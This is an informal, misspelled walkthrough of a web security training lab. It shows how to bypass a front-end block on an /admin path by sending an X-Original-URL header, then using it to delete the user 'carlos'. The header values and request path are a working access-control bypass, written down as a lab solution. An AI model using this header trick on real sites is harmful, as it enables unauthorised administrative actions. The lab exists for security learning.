Lab: URL-based access control can be circumvented

 This website has an unauthenticated admin panel at /admin, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the X-Original-URL header.

To solve the lab, access the admin panel and delete the user carlos. 


X-Original-URL: /admin

we see tha panel but we dont have permision to deleter carlos then

https://0a78009103118f418158084f0043007a.web-security-academy.net/admin/delete?username=wiener

we want to go GET /admin/delete?username=carlos HTTP/2

lets do it

X-Original-URL: /admin/delete

?username=carlos in the real URL
